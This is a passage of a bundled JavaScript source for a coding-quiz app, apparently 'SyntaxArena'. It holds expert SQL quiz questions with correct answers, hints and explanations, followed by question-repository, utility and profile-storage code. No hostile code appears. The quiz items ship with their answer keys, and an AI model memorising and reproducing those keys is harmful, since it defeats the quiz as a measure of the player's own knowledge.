    hint: "Every row has visibility metadata (e.g. `xmin` and `xmax`). Older versions remain visible to older open transactions.",
    explanation: "In MVCC systems (like PostgreSQL), updates don't overwrite rows in place: they insert a new row version with creation transaction ID `xmin` and mark the old row version expired (`xmax`). Transactions read consistent snapshots visible to their start time without acquiring read locks.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["mvcc", "database_internals", "concurrency"]
  },
  {
    id: "sql-exp-004",
    language: "sql",
    difficulty: "expert",
    type: "predict_output",
    topic: "cte",
    subtopic: "recursive_cte",
    standardVersion: "ANSI SQL:1999",
    prompt: "What does this recursive CTE generate?",
    code: "WITH RECURSIVE Counter AS (\n    SELECT 1 AS n\n    UNION ALL\n    SELECT n + 1 FROM Counter WHERE n < 5\n)\nSELECT SUM(n) FROM Counter;",
    options: ["15", "10", "5", "Infinite Loop Error"],
    correctAnswer: "15",
    acceptedAnswers: ["15"],
    hint: "The base query yields 1. The recursive step yields 2, 3, 4, 5. 1 + 2 + 3 + 4 + 5 = 15.",
    explanation: "The anchor query produces row `n = 1`. The recursive query increments `n` until `n < 5` terminates after generating rows 2, 3, 4, and 5. `SUM(n)` computes `1 + 2 + 3 + 4 + 5 = 15`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["recursive_cte", "cte", "sql"]
  },
  {
    id: "sql-exp-005",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_internals",
    subtopic: "join_algorithms",
    standardVersion: "Query Planner Algorithms",
    prompt: "Under what conditions does a relational query planner choose a **Hash Join** over a Nested Loop Join?",
    code: "// Query Planner Strategy: Hash Join vs Nested Loop vs Merge Join",
    options: [
      "Joining two large, unsorted datasets with an equality predicate (`=`), where the smaller relation fits into memory to build an in-memory hash table",
      "When joining on range conditions (`<` or `>`)",
      "When both tables have clustered indexes on the join key",
      "Only when the database server has multiple GPUs"
    ],
    correctAnswer: "Joining two large, unsorted datasets with an equality predicate (`=`), where the smaller relation fits into memory to build an in-memory hash table",
    acceptedAnswers: ["Joining two large, unsorted datasets with an equality predicate (`=`), where the smaller relation fits into memory to build an in-memory hash table"],
    hint: "Hash join builds an in-memory hash table on the smaller table's join keys, then probes it with rows from the outer table.",
    explanation: "A Hash Join is preferred for equi-joins (`=`) between large, unsorted datasets. The planner scans the smaller table (build phase) to construct an in-memory hash table on the join key, then scans the larger table (probe phase) matching keys in $O(1)$ time.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["hash_join", "query_planner", "database_internals"]
  },
  {
    id: "sql-exp-006",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "pessimistic_locking",
    standardVersion: "ANSI SQL",
    prompt: "What does adding `FOR UPDATE` to a SELECT query do in a transaction?",
    code: "BEGIN;\nSELECT balance FROM accounts WHERE user_id = 42 FOR UPDATE;\n-- Modify balance and commit\nUPDATE accounts SET balance = balance - 100 WHERE user_id = 42;\nCOMMIT;",
    options: [
      "Acquires exclusive row-level locks on the selected rows, preventing concurrent transactions from updating or locking them until this transaction commits",
      "Converts the database to read-only mode",
      "Automatically commits the transaction immediately",
      "Creates a temporary backup table in memory"
    ],
    correctAnswer: "Acquires exclusive row-level locks on the selected rows, preventing concurrent transactions from updating or locking them until this transaction commits",
    acceptedAnswers: ["Acquires exclusive row-level locks on the selected rows, preventing concurrent transactions from updating or locking them until this transaction commits"],
    hint: "`SELECT ... FOR UPDATE` implements pessimistic concurrency control to prevent lost updates.",
    explanation: "`SELECT ... FOR UPDATE` acquires an exclusive row-level lock on all matched rows. Any concurrent transaction attempting to read with `FOR UPDATE` or mutate those rows blocks until the holding transaction issues `COMMIT` or `ROLLBACK`, preventing race conditions in financial operations.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["for_update", "locking", "pessimistic_concurrency"]
  },
  {
    id: "sql-exp-007",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_optimization",
    subtopic: "sargable_queries",
    standardVersion: "Performance Engineering",
    prompt: "Why is `WHERE EXTRACT(YEAR FROM created_at) = 2024` considered non-SARGable compared to `WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01'`?",
    code: "-- Non-SARGable: WHERE EXTRACT(YEAR FROM created_at) = 2024\n-- SARGable:     WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01'",
    options: [
      "Applying a function to the indexed column prevents the B-Tree index from seeking directly, forcing a full table scan across all rows",
      "Because EXTRACT is deprecated in modern SQL",
      "Because timestamp comparisons cannot use ranges",
      "Because 2024 must be written as a string"
    ],
    correctAnswer: "Applying a function to the indexed column prevents the B-Tree index from seeking directly, forcing a full table scan across all rows",
    acceptedAnswers: ["Applying a function to the indexed column prevents the B-Tree index from seeking directly, forcing a full table scan across all rows"],
    hint: "SARGable stands for Search Argument Able. Functions wrapping indexed columns hide the direct index values from the optimizer.",
    explanation: "When an indexed column is wrapped inside a function (`EXTRACT(YEAR FROM col)` or `LOWER(col)`), the query engine must evaluate the function on every single row in the table, preventing a B-Tree range seek unless an explicit expression/functional index is present.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["sargable", "indexing", "performance"]
  },
  {
    id: "sql-exp-008",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "indexing",
    subtopic: "covering_index",
    standardVersion: "Query Optimization",
    prompt: "What is an **Index-Only Scan** enabled by a covering index?",
    code: "-- Table users has 1,000,000 rows\n-- Index: CREATE INDEX idx_users_cov ON users(status) INCLUDE (email);\nSELECT email FROM users WHERE status = 'active';",
    options: [
      "The query planner satisfies the query entirely from the B-Tree index pages without visiting table data pages (heaps) at all",
      "The query scans only the primary key column",
      "The query only reads data from memory cache",
      "The index covers both the read and write replicas simultaneously"
    ],
    correctAnswer: "The query planner satisfies the query entirely from the B-Tree index pages without visiting table data pages (heaps) at all",
    acceptedAnswers: ["The query planner satisfies the query entirely from the B-Tree index pages without visiting table data pages (heaps) at all"],
    hint: "If all columns requested in SELECT and WHERE exist inside the index, the database never needs to touch the table heap.",
    explanation: "An Index-Only Scan occurs when all columns required by the query (both filter predicates and projected output columns) are stored in the index structure (via composite keys or `INCLUDE`). The database satisfies the query directly from the index, eliminating heap page I/O.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["covering_index", "index_only_scan", "performance"]
  },
  {
    id: "sql-exp-009",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_internals",
    subtopic: "wal_logging",
    standardVersion: "Database Recovery",
    prompt: "Why is Write-Ahead Logging (WAL) essential for guaranteeing the Durability ('D') in ACID?",
    code: "// Database Storage Engine:\n1. Write log record to disk (WAL)\n2. Commit transaction\n3. Flush modified data pages to disk lazily in background",
    options: [
      "Changes must be sequentially flushed to the append-only WAL disk log before a transaction is acknowledged as committed, allowing crash recovery to replay changes",
      "WAL encrypts database files before transmitting them over SSL",
      "WAL distributes data across multiple RAID partitions",
      "WAL automatically compresses SQL queries"
    ],
    correctAnswer: "Changes must be sequentially flushed to the append-only WAL disk log before a transaction is acknowledged as committed, allowing crash recovery to replay changes",
    acceptedAnswers: ["Changes must be sequentially flushed to the append-only WAL disk log before a transaction is acknowledged as committed, allowing crash recovery to replay changes"],
    hint: "Flushing random dirty data pages to disk is slow. Appending sequentially to the WAL log is fast and ensures durability on crash.",
    explanation: "Write-Ahead Logging dictates that no data page changes can be written to permanent storage until the corresponding log entry is safely written to the append-only WAL log. If the server suddenly loses power, the crash recovery mechanism replays the WAL to restore all committed transactions.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["wal", "acid", "durability", "internals"]
  },
  {
    id: "sql-exp-010",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "views",
    subtopic: "materialized_views",
    standardVersion: "PostgreSQL / Enterprise SQL",
    prompt: "What is the key functional difference between a standard SQL `VIEW` and a `MATERIALIZED VIEW`?",
    code: "CREATE MATERIALIZED VIEW sales_summary AS\nSELECT dept, SUM(amount) FROM sales GROUP BY dept;\n\nREFRESH MATERIALIZED VIEW sales_summary;",
    options: [
      "A Materialized View physically caches the query results on disk and must be explicitly refreshed to reflect subsequent database mutations",
      "A Materialized View is deleted when the database is restarted",
      "A Materialized View can only be queried by the postgres superuser",
      "A Materialized View cannot be indexed"
    ],
    correctAnswer: "A Materialized View physically caches the query results on disk and must be explicitly refreshed to reflect subsequent database mutations",
    acceptedAnswers: ["A Materialized View physically caches the query results on disk and must be explicitly refreshed to reflect subsequent database mutations"],
    hint: "Standard views recompute the query on every SELECT. Materialized views persist the computed rows on disk.",
    explanation: "Unlike a standard view (which is merely stored SQL text evaluated on demand), a `MATERIALIZED VIEW` stores the physical results on disk, supporting dedicated indexes. Because it stores a snapshot, it must be updated with `REFRESH MATERIALIZED VIEW`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["materialized_views", "caching", "sql"]
  },
  {
    id: "sql-exp-011",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "upsert",
    subtopic: "on_conflict_do_update",
    standardVersion: "PostgreSQL 9.5+ / ANSI SQL:2008",
    prompt: "How does the `INSERT ... ON CONFLICT (...) DO UPDATE` clause execute an atomic Upsert in PostgreSQL?",
    code: "INSERT INTO counters (key, count) \nVALUES ('page_views', 1)\nON CONFLICT (key) \nDO UPDATE SET count = counters.count + 1;",
    options: [
      "Attempts to insert the row; if a uniqueness constraint on `key` is violated, it atomically executes the UPDATE instead without race conditions",
      "Deletes the existing row and creates a new one with a new primary key",
      "Throws a duplicate key warning and aborts the transaction",
      "Executes the update only if the database is in single-user mode"
    ],
    correctAnswer: "Attempts to insert the row; if a uniqueness constraint on `key` is violated, it atomically executes the UPDATE instead without race conditions",
    acceptedAnswers: ["Attempts to insert the row; if a uniqueness constraint on `key` is violated, it atomically executes the UPDATE instead without race conditions"],
    hint: "Upsert merges INSERT and UPDATE atomically, eliminating the need for client-side SELECT-then-INSERT race conditions.",
    explanation: "`ON CONFLICT ... DO UPDATE` provides atomic upsert capability. It attempts an INSERT, but if the unique index on `key` conflicts, it seamlessly transitions into updating the existing row in a single atomic transaction step without race conditions.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["upsert", "on_conflict", "postgresql"]
  },
  {
    id: "sql-exp-012",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_internals",
    subtopic: "vacuum_bloat",
    standardVersion: "PostgreSQL MVCC",
    prompt: "Why is the `VACUUM` process necessary in PostgreSQL databases?",
    code: "VACUUM (ANALYZE, VERBOSE) large_table;",
    options: [
      "To reclaim space occupied by dead row versions (created by UPDATEs and DELETEs) and freeze transaction IDs to prevent wraparound failure",
      "To compress JPEG images stored in bytea columns",
      "To delete rows older than 30 days automatically",
      "To recompile stored procedures into C machine code"
    ],
    correctAnswer: "To reclaim space occupied by dead row versions (created by UPDATEs and DELETEs) and freeze transaction IDs to prevent wraparound failure",
    acceptedAnswers: ["To reclaim space occupied by dead row versions (created by UPDATEs and DELETEs) and freeze transaction IDs to prevent wraparound failure"],
    hint: "In MVCC, DELETE marks rows dead, and UPDATE leaves the old version dead. Dead tuples cause table bloat until reclaimed.",
    explanation: "Because PostgreSQL MVCC writes new versions rather than in-place updates, deleted or updated rows leave 'dead tuples' in table pages. `VACUUM` scans pages, marks dead tuple space as reusable for new inserts, updates visibility maps, and freezes transaction IDs to prevent 32-bit integer wraparound.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["vacuum", "postgres", "mvcc", "bloat"]
  },
  {
    id: "sql-exp-013",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "partitioning",
    subtopic: "declarative_partitioning",
    standardVersion: "PostgreSQL 10+ / ANSI SQL",
    prompt: "How does **Partition Pruning** improve performance on partitioned tables?",
    code: "CREATE TABLE sales (id INT, sale_date DATE) PARTITION BY RANGE (sale_date);\nSELECT * FROM sales WHERE sale_date = '2026-05-15';",
    options: [
      "The query optimizer analyzes the query WHERE predicate and skips reading partition tables that cannot possibly contain matching data",
      "It deletes old partitions automatically after 1 year",
      "It converts partitioned tables to NoSQL collections",
      "It runs queries on the GPU"
    ],
    correctAnswer: "The query optimizer analyzes the query WHERE predicate and skips reading partition tables that cannot possibly contain matching data",
    acceptedAnswers: ["The query optimizer analyzes the query WHERE predicate and skips reading partition tables that cannot possibly contain matching data"],
    hint: "If the query asks for May 2026, the engine reads only the `sales_2026_05` partition, ignoring all other years and months.",
    explanation: "Partition pruning allows the query optimizer to analyze the query's WHERE clauses and exclude unneeded partitions from the execution plan. Instead of scanning 100 million rows across all partitions, the engine scans only the partition matching the filter date range.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["partitioning", "pruning", "optimization"]
  },
  {
    id: "sql-exp-014",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "json_sql",
    subtopic: "jsonb_gin_index",
    standardVersion: "PostgreSQL 9.4+",
    prompt: "What is the primary operational advantage of storing semi-structured documents in PostgreSQL `JSONB` with a GIN index compared to plain `JSON`?",
    code: "CREATE INDEX idx_user_data ON profiles USING GIN (metadata);\nSELECT * FROM profiles WHERE metadata @> '{\"verified\": true}';",
    options: [
      "`JSONB` stores decomposed binary format supporting indexed lookups via GIN (`@>` containment) in logarithmic time, whereas plain `JSON` requires text re-parsing on every query",
      "`JSONB` only supports arrays; plain `JSON` only supports objects",
      "`JSONB` is compressed with zip compression",
      "Plain `JSON` can only store strings"
    ],
    correctAnswer: "`JSONB` stores decomposed binary format supporting indexed lookups via GIN (`@>` containment) in logarithmic time, whereas plain `JSON` requires text re-parsing on every query",
    acceptedAnswers: ["`JSONB` stores decomposed binary format supporting indexed lookups via GIN (`@>` containment) in logarithmic time, whereas plain `JSON` requires text re-parsing on every query"],
    hint: "JSONB is binary JSON. GIN (Generalized Inverted Index) indexes keys and values inside JSONB documents.",
    explanation: "Plain `JSON` stores an exact copy of the text string, requiring full string re-parsing on every access. `JSONB` stores decomposed binary data that eliminates re-parsing, strips whitespace, and crucially supports Generalized Inverted Indexes (GIN) for fast key/value containment queries (`@>`).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["jsonb", "gin_index", "postgresql"]
  },
  {
    id: "sql-exp-015",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "database_theory",
    subtopic: "bcnf_normalization",
    standardVersion: "Relational Database Theory",
    prompt: "What strict condition must be satisfied for a relational schema to be in Boyce-Codd Normal Form (BCNF)?",
    code: "// Normal Forms: 1NF -> 2NF -> 3NF -> BCNF",
    options: [
      "Every non-trivial functional dependency $X \\rightarrow Y$ must have $X$ as a superkey",
      "All columns must be numbers or dates",
      "No table can contain more than 10 columns",
      "Every table must have a foreign key pointing to itself"
    ],
    correctAnswer: "Every non-trivial functional dependency $X \\rightarrow Y$ must have $X$ as a superkey",
    acceptedAnswers: ["Every non-trivial functional dependency $X \\rightarrow Y$ must have $X$ as a superkey"],
    hint: "3NF allows $Y$ to be a prime attribute (part of a candidate key). BCNF removes this exception: $X$ MUST be a superkey.",
    explanation: "BCNF is a stricter version of Third Normal Form (3NF). A relation is in BCNF if and only if for every non-trivial functional dependency $X \\rightarrow Y$, the determinant $X$ is a superkey of the relation. This eliminates all redundancy based on functional dependencies.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["normalization", "bcnf", "database_theory"]
  },
  {
    id: "sql-exp-016",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "query_plans",
    subtopic: "explain_analyze",
    standardVersion: "PostgreSQL / ANSI",
    prompt: "What is the difference between running `EXPLAIN` and `EXPLAIN ANALYZE` on a query in PostgreSQL?",
    code: "EXPLAIN ANALYZE SELECT * FROM users WHERE score > 500;",
    options: [
      "`EXPLAIN` shows the planner's estimated cost and rows without executing the query; `EXPLAIN ANALYZE` actually executes the query and reports real runtime measurements",
      "`EXPLAIN ANALYZE` only works in development environments",
      "`EXPLAIN` executes the query 10 times to take an average",
      "`EXPLAIN ANALYZE` converts the query into a stored procedure"
    ],
    correctAnswer: "`EXPLAIN` shows the planner's estimated cost and rows without executing the query; `EXPLAIN ANALYZE` actually executes the query and reports real runtime measurements",
    acceptedAnswers: ["`EXPLAIN` shows the planner's estimated cost and rows without executing the query; `EXPLAIN ANALYZE` actually executes the query and reports real runtime measurements"],
    hint: "`EXPLAIN` is safe for mutations because it doesn't run the statement. `EXPLAIN ANALYZE` DOES execute the statement.",
    explanation: "`EXPLAIN` displays the query execution plan with estimated costs generated by the cost optimizer based on statistics without running the query. `EXPLAIN ANALYZE` actually executes the query, outputting real elapsed times, actual rows returned, and buffer hit rates alongside planner estimates.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["explain", "explain_analyze", "query_plans"]
  },
  {
    id: "sql-exp-017",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "distributed_databases",
    subtopic: "two_phase_commit",
    standardVersion: "Distributed Transactions",
    prompt: "What are the two phases of the Two-Phase Commit (2PC) protocol in distributed databases?",
    code: "// Distributed Transaction Protocol (2PC)\nCoordinator <---> Multiple Participant Resource Managers (Nodes)",
    options: [
      "Prepare Phase (voting if ready to commit) and Commit Phase (executing permanent commit or abort)",
      "Lock Phase and Unlock Phase",
      "Read Phase and Write Phase",
      "Client Phase and Server Phase"
    ],
    correctAnswer: "Prepare Phase (voting if ready to commit) and Commit Phase (executing permanent commit or abort)",
    acceptedAnswers: ["Prepare Phase (voting if ready to commit) and Commit Phase (executing permanent commit or abort)"],
    hint: "Phase 1: Coordinator asks all nodes 'Can you commit?'. Phase 2: If all vote yes, coordinator says 'Commit!'; otherwise 'Abort!'.",
    explanation: "Two-Phase Commit coordinates atomic transactions across distributed database nodes. In Phase 1 (Prepare), the coordinator asks all participants to write to log and vote if ready to commit. In Phase 2 (Commit), if all voted yes, the coordinator issues global commit; otherwise it orders global abort.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["2pc", "distributed_databases", "transactions"]
  },
  {
    id: "sql-exp-018",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "deadlock_resolution",
    standardVersion: "Database Engine Architecture",
    prompt: "How do relational database engines handle a Deadlock between two concurrent transactions?",
    code: "// Deadlock scenario:\nTx1 holds lock A, requests lock B\nTx2 holds lock B, requests lock A",
    options: [
      "The engine detects the cycle in its internal wait-for graph, aborts one transaction (the deadlock victim) with a serialization error, and allows the other to proceed",
      "Both transactions are permanently suspended until the server is rebooted",
      "The database engine merges both transactions into one",
      "The operating system terminates the database daemon"
    ],
    correctAnswer: "The engine detects the cycle in its internal wait-for graph, aborts one transaction (the deadlock victim) with a serialization error, and allows the other to proceed",
    acceptedAnswers: ["The engine detects the cycle in its internal wait-for graph, aborts one transaction (the deadlock victim) with a serialization error, and allows the other to proceed"],
    hint: "The database uses a background deadlock detector that breaks dependency cycles by killing the lowest-cost transaction.",
    explanation: "Databases maintain an internal wait-for graph of lock dependencies. When a cycle is detected, the engine aborts one of the transactions (the 'victim'), rolls back its changes, and raises a deadlock error (e.g. Postgres code 40P01) so the client application can retry.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["deadlock", "concurrency", "locking"]
  },
  {
    id: "sql-exp-019",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "indexing",
    subtopic: "partial_indexes",
    standardVersion: "PostgreSQL / SQLite",
    prompt: "What is the primary advantage of creating a **Partial Index** in PostgreSQL?",
    code: "CREATE INDEX idx_unprocessed_orders ON orders (created_at)\nWHERE status = 'unprocessed';",
    options: [
      "The index only indexes rows matching the `WHERE` clause, drastically reducing index size and write overhead while accelerating targeted queries",
      "The index only occupies memory in the evenings",
      "The index works on partial string matches only",
      "It allows tables without primary keys to be indexed"
    ],
    correctAnswer: "The index only indexes rows matching the `WHERE` clause, drastically reducing index size and write overhead while accelerating targeted queries",
    acceptedAnswers: ["The index only indexes rows matching the `WHERE` clause, drastically reducing index size and write overhead while accelerating targeted queries"],
    hint: "If 99% of orders are completed and only 1% are unprocessed, indexing only the 1% saves massive disk space.",
    explanation: "A Partial Index is built over a subset of a table defined by a conditional predicate (`WHERE status = 'unprocessed'`). If most rows don't match, the index remains small, fits easily in RAM buffer caches, and doesn't incur maintenance overhead during updates to excluded rows.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["partial_index", "indexing", "optimization"]
  },
  {
    id: "sql-exp-020",
    language: "sql",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "replication",
    subtopic: "logical_vs_physical",
    standardVersion: "Database High Availability",
    prompt: "What distinguishes **Logical Replication** from **Physical Streaming Replication** in PostgreSQL?",
    code: "// PostgreSQL Replication Architectures\nPhysical (WAL block-level) vs Logical (Pub/Sub row-level change streams)",
    options: [
      "Physical replication copies byte-for-byte WAL blocks (identical replica); Logical replication publishes row-level change events, allowing selective table replication across different Postgres versions and schemas",
      "Physical replication requires optical fiber; Logical replication uses Ethernet",
      "Logical replication cannot replicate INSERT operations",
      "Physical replication is single-threaded; Logical replication requires Kubernetes"
    ],
    correctAnswer: "Physical replication copies byte-for-byte WAL blocks (identical replica); Logical replication publishes row-level change events, allowing selective table replication across different Postgres versions and schemas",
    acceptedAnswers: ["Physical replication copies byte-for-byte WAL blocks (identical replica); Logical replication publishes row-level change events, allowing selective table replication across different Postgres versions and schemas"],
    hint: "Physical replication creates an exact binary clone of the whole cluster. Logical replication streams row-level changes for specific tables.",
    explanation: "Physical streaming replication operates at the disk-block level, replicating raw WAL byte-for-byte (requiring identical PostgreSQL versions and architecture). Logical replication decodes WAL into row-level logical changes (insert, update, delete), enabling selective table replication and zero-downtime major version upgrades.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["replication", "high_availability", "postgres"]
  }
];

/* --- End of data/sql-questions.js --- */

/* --- Start of js/data/index.js --- */
/**
 * SyntaxArena Question Catalog Aggregator
 * Unified access to Python, C, C++, and Java challenges.
 * Source of truth: docs/QUESTION_SCHEMA.md
 */









var LANGUAGE_METADATA = window.LANGUAGE_METADATA = {
  python: {
    id: 'python',
    name: 'Python 3',
    version: 'Python 3.10+',
    filename: 'solution.py',
    tagClass: 'tag-python',
    color: '#3776AB',
    accentColor: '#FFD438'
  },
  c: {
    id: 'c',
    name: 'C (C99/C11)',
    version: 'C99 Standard',
    filename: 'solution.c',
    tagClass: 'tag-c',
    color: '#659AD2',
    accentColor: '#A5D6FF'
  },
  cpp: {
    id: 'cpp',
    name: 'C++ (C++20)',
    version: 'C++17/C++20',
    filename: 'solution.cpp',
    tagClass: 'tag-cpp',
    color: '#00599C',
    accentColor: '#79C0FF'
  },
  java: {
    id: 'java',
    name: 'Java (SE 17)',
    version: 'Java 17 LTS',
    filename: 'Solution.java',
    tagClass: 'tag-java',
    color: '#EA2D2E',
    accentColor: '#FFA657'
  },
  cyber: {
    id: 'cyber',
    name: 'Cyber & Linux',
    version: 'Linux / Bash & InfoSec',
    filename: 'exploit.sh',
    tagClass: 'tag-cyber',
    color: '#00FF66',
    accentColor: '#39FF14'
  },
  javascript: {
    id: 'javascript',
    name: 'JavaScript (ES2024)',
    version: 'ECMAScript 2024',
    filename: 'app.js',
    tagClass: 'tag-javascript',
    color: '#F7DF1E',
    accentColor: '#FFE600'
  },
  rust: {
    id: 'rust',
    name: 'Rust (2021)',
    version: 'Rust 2021 Edition',
    filename: 'main.rs',
    tagClass: 'tag-rust',
    color: '#DEA584',
    accentColor: '#F74C00'
  },
  sql: {
    id: 'sql',
    name: 'SQL (ANSI/PostgreSQL)',
    version: 'ANSI SQL / PostgreSQL 15+',
    filename: 'query.sql',
    tagClass: 'tag-sql',
    color: '#336791',
    accentColor: '#4AA3DF'
  }
};

var QuestionRepository = window.QuestionRepository = {
  /**
   * Get all questions for a given language.
   * @param {'python'|'c'|'cpp'|'java'|'cyber'|'javascript'|'rust'|'sql'} lang
   * @returns {Array}
   */
  getByLanguage(lang) {
    const key = (lang || 'python').toLowerCase();
    switch (key) {
      case 'c': return cQuestions;
      case 'cpp': return cppQuestions;
      case 'java': return javaQuestions;
      case 'cyber': return cyberQuestions;
      case 'js':
      case 'javascript': return javascriptQuestions;
      case 'rust': return rustQuestions;
      case 'sql': return sqlQuestions;
      case 'python':
      default:
        return pythonQuestions;
    }
  },

  /**
   * Get a single question by language, difficulty, and index.
   * @param {string} lang
   * @param {string} [difficulty]
   * @param {number} [index=0]
   */
  getQuestion(lang, difficulty = 'beginner', index = 0) {
    const list = this.getByLanguage(lang);
    const filtered = difficulty ? list.filter(q => q.difficulty === difficulty) : list;
    const pool = filtered.length > 0 ? filtered : list;
    const safeIdx = Math.max(0, Math.min(index, pool.length - 1));
    return pool[safeIdx] || pool[0];
  },

  /**
   * Get language presentation metadata.
   */
  getLanguageMeta(lang) {
    const key = (lang || 'python').toLowerCase();
    return LANGUAGE_METADATA[key] || LANGUAGE_METADATA.python;
  }
};

/* --- End of js/data/index.js --- */

/* --- Start of js/utils.js --- */
/**
 * SyntaxArena Utility Library
 * Reusable, side-effect free helpers
 */

var Utils = window.Utils = {
  /**
   * Escape special HTML characters to prevent XSS injection.
   * @param {string} str
   * @returns {string}
   */
  escapeHTML(str) {
    if (typeof str !== 'string') return '';
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return str.replace(/[&<>"']/g, m => map[m]);
  },

  /**
   * Alias for escapeHTML.
   */
  escapeHtml(str) {
    return this.escapeHTML(str);
  },

  /**
   * Safe document.querySelector wrapper.
   * @param {string} selector
   * @param {Element|Document} [parent=document]
   * @returns {Element|null}
   */
  qs(selector, parent = document) {
    try {
      return parent.querySelector(selector);
    } catch (err) {
      console.warn(`[Utils.qs] Invalid selector: ${selector}`, err);
      return null;
    }
  },

  /**
   * Safe document.querySelectorAll wrapper returning an Array.
   * @param {string} selector
   * @param {Element|Document} [parent=document]
   * @returns {Element[]}
   */
  qsa(selector, parent = document) {
    try {
      return Array.from(parent.querySelectorAll(selector));
    } catch (err) {
      console.warn(`[Utils.qsa] Invalid selector: ${selector}`, err);
      return [];
    }
  },

  /**
   * Add event listener with auto-cleanup helper.
   * @param {EventTarget} target
   * @param {string} event
   * @param {Function} handler
   * @param {object|boolean} [options=false]
   * @returns {Function} Unsubscribe function
   */
  on(target, event, handler, options = false) {
    if (!target || typeof target.addEventListener !== 'function') {
      return () => {};
    }
    target.addEventListener(event, handler, options);
    return () => target.removeEventListener(event, handler, options);
  },

  /**
   * Debounce a function call.
   * @param {Function} fn
   * @param {number} waitMs
   * @returns {Function}
   */
  debounce(fn, waitMs = 250) {
    let timeoutId = null;
    return function (...args) {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        fn.apply(this, args);
      }, waitMs);
    };
  },

  /**
   * Generate a unique prefixed identifier.
   * @param {string} prefix
   * @returns {string}
   */
  generateId(prefix = 'id') {
    const randomHex = Math.random().toString(16).substring(2, 10);
    const timeHex = Date.now().toString(16).slice(-4);
    return `${prefix}-${timeHex}${randomHex}`;
  },

  /**
   * Clamp a numerical value between min and max bounds.
   * @param {number} val
   * @param {number} min
   * @param {number} max
   * @returns {number}
   */
  clamp(val, min, max) {
    return Math.min(Math.max(val, min), max);
  },

  /**
   * Safe check for localStorage availability (handles iOS private browsing and disabled cookies).
   * @returns {boolean}
   */
  isStorageAvailable() {
    try {
      const testKey = '__syntaxarena_storage_test__';
      window.localStorage.setItem(testKey, testKey);
      window.localStorage.removeItem(testKey);
      return true;
    } catch (e) {
      return false;
    }
  }
};

/* --- End of js/utils.js --- */

/* --- Start of js/storage.js --- */
/**
 * SyntaxArena Storage Manager (Batch 9 Hardened)
 * Safe localStorage abstraction with schema versioning, deep migration,
 * corruption recovery, degradation tracking, and in-memory fallback.
 * Source of truth: docs/ARCHITECTURE.md & docs/BATCH_9_PLAN.md
 */


var STORAGE_KEY = window.STORAGE_KEY = 'syntaxarena_storage_v1';
var CORRUPTED_BACKUP_KEY = window.CORRUPTED_BACKUP_KEY = 'syntaxarena_corrupted_backup';
var CURRENT_SCHEMA_VERSION = window.CURRENT_SCHEMA_VERSION = 1;

/**
 * Factory for a complete default profile structure.
 */
window.createDefaultProfile = createDefaultProfile; function createDefaultProfile(id = 'prof-default01', username = 'ScriptAdept') {
  return {
    id,
    username,
    avatarId: 'cyber_fox',
    onboardingComplete: false,
    preferences: {
      language: 'python',
      difficulty: 'beginner'
    },
    createdAt: Date.now(),
    level: 1,
    xp: 0,
    lifetimeXP: 0,
    totalScore: 0,
    hasReceivedJoiningBonus: false,
    dayStreak: 1,
    lastLoginDate: null,
    rank: 'Script Novice',
    stats: {
      gamesPlayed: 0,
      questionsAttempted: 0,
      questionsCorrect: 0,
      highestStreak: 0,
      dailyChallengesCompleted: 0,
      lastDailyDate: null
    },
    campaign: {
      python:     { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      c:          { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      cpp:        { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      java:       { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      cyber:      { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      javascript: { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      rust:       { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' },
      sql:        { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' }
    },
    completedTiers: {},
    stageStars: {},
    completedStages: {},
    unlockedAchievements: [],
    purchasedBadges: [],
    missedQuestionIds: [],
    sessionHistory: [],
    processedSessionIds: [],
    unlockedThemes: ['dark'],
